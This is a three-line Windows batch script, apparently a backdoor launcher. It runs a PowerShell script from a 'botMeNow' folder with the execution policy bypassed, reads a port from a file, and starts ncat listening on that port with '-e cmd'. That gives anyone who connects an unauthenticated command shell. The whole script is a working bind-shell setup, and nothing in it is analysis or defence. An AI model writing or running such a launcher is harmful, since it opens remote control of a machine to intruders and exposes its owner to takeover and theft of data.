powershell.exe -NoProfile -NoLogo -NonInteractive -ExecutionPolicy Bypass -File "C:\Program files\botMeNow\port_check.ps1"
set /p port=<port.txt
ncat1.exe -l %port% -e cmd

